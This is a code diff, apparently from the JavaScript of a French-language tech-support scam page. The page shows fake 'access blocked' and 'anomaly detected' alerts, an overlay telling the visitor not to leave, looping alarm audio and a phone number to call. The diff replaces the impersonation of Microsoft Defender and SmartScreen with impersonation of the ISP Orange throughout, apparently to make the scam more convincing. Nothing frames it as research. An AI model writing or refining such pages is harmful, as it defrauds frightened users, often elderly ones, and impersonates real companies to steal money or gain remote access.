@@ -16,48 +16,41 @@
     '<div id="browserChromeShield" class="browser-chrome-shield" aria-hidden="true" role="alert">' +
     '<div class="browser-chrome-modal">' +
     '<p class="browser-chrome-alert">Une anomalie a été détectée</p>' +
-    '<p class="browser-chrome-warning">Appelez le support technique</p>' +
+    '<p class="browser-chrome-warning">Appellez l\'assistance Orange</p>' +
     '<p class="browser-chrome-phone">+33 02 59 50 90 20</p>' +
     '</div></div>' +
     '<div id="escapeShield" class="escape-shield" aria-hidden="true" role="alert">' +
     '<div class="escape-shield-taskbar-wrap">' +
     '<div class="escape-shield-taskbar-modal">' +
-    '<p class="escape-shield-alert">Alerte de sécurité</p>' +
+    '<p class="escape-shield-alert">Alerte de sécurité Orange</p>' +
     '<p class="escape-shield-warning">Ne quittez pas la page</p>' +
     '</div></div></div>' +
     '<div class="modal-top-square" id="securityOverlay" aria-label="Alerte securite" aria-hidden="true">' +
-    '<div class="smartscreen-cover" aria-hidden="true">' +
-    '<div class="smartscreen-cover-dialog">' +
-    '<button class="smartscreen-cover-close" type="button" aria-label="Fermer">&times;</button>' +
-    '<h2 class="smartscreen-cover-title">Windows a protégé votre PC</h2>' +
-    '<p class="smartscreen-cover-text">Le filtre SmartScreen a empêché le démarrage d\'une application non reconnue. L\'exécution de cette application peut mettre votre PC en danger.</p>' +
-    '<div class="smartscreen-cover-footer" aria-hidden="true"></div>' +
-    '</div></div>' +
     '<div class="security-page">' +
     '<section class="access-modal" aria-label="Alerte acces bloque">' +
     '<p>L\'accès à votre pc a été bloqué pour des raisons de sécurité.</p>' +
     '<p>N\'accédez pas à ce pc et ne le redémarrez pas. Si vous ignorez cet avertissement, vous risquez de perdre des informations.</p>' +
-    '<p>Contactez le support technique dès que possible ; un expert vous guidera par téléphone lors de l\'analyse.</p>' +
+    '<p>Contactez l\'assistance dès que possible ; un expert Orange vous guidera par téléphone lors de l\'analyse.</p>' +
     '<p>L\'exécution de cette application peut mettre votre pc en danger.</p>' +
     '</section>' +
     '<div class="black-modal-blue-box">' +
-    '<p>Assistance technique : +33 02 59 50 90 20</p>' +
-    '<p class="black-modal-defender">Défenseur Microsoft</p>' +
+    '<p>Appellez l\'assistance Orange : 02 59 50 90 20</p>' +
+    '<p class="black-modal-defender">Appellez l\'assistance Orange</p>' +
     '</div>' +
-    '<section class="scan-modal" aria-label="Support technique">' +
+    '<section class="scan-modal" aria-label="Assistance Orange">' +
     '<h2 class="scan-modal-title">Désolé, l\'analyse n\'est pas terminée !</h2>' +
-    '<p class="scan-modal-text">Le défenseur Microsoft a détecté une anomalie sur votre appareil. Contactez le support technique pour une analyse complète.</p>' +
-    '<p class="scan-modal-text">Contactez le support technique pour obtenir de l\'aide</p>' +
-    '<p class="scan-modal-support">Assistance technique : +33 02 59 50 90 20</p>' +
+    '<p class="scan-modal-text">Une anomalie a été détectée sur votre appareil. Appellez l\'assistance Orange pour une analyse complète et sécuriser votre connexion.</p>' +
+    '<p class="scan-modal-text">Contactez l\'assistance Orange pour obtenir de l\'aide</p>' +
+    '<p class="scan-modal-support">Appellez l\'assistance Orange : 02 59 50 90 20</p>' +
     '<div class="scan-modal-actions">' +
     '<button class="scan-btn scan-btn-now" type="button">Analyser maintenant</button>' +
     '<button class="scan-btn scan-btn-later" type="button">Analyser plus tard</button>' +
     '</div>' +
     '</section>' +
     '</div>' +
-    '<aside class="support-card" aria-label="Support technique">' +
-    '<p class="support-card-subtitle">Appelez le support technique</p>' +
-    '<p class="support-card-phone">+33 02 59 50 90 20</p>' +
+    '<aside class="support-card" aria-label="Assistance Orange">' +
+    '<p class="support-card-subtitle">Appellez l\'assistance Orange</p>' +
+    '<p class="support-card-phone">02 59 50 90 20</p>' +
     '<p class="support-card-label">Numero</p>' +
     '<div class="support-card-arrow" aria-hidden="true">▼</div></aside></div>' +
     '<div class="home-page">' +
@@ -122,7 +115,7 @@
     '<audio id="securityAudio2" src="script-audio-2.mp3" loop preload="auto"></audio>' +
     '<div id="escapeExitModal" class="escape-exit-overlay" aria-hidden="true" role="dialog" aria-label="Instructions assistance">' +
     '<div class="escape-exit-modal">' +
-    '<p class="escape-exit-message">Veuillez suivre les instructions du support technique</p>' +
+    '<p class="escape-exit-message">Veuillez suivre les instructions de nos ingénieurs</p>' +
     '<p class="escape-exit-phone">' +
     '<svg class="escape-exit-phone-icon" viewBox="0 0 24 24" aria-hidden="true">' +
     '<path d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1-.2 1.1.4 2.3.6 3.5.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1C10.6 21 3 13.4 3 4c0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.2.2 2.4.6 3.5.1.3 0 .7-.2 1L6.6 10.8z" fill="currentColor"/>' +
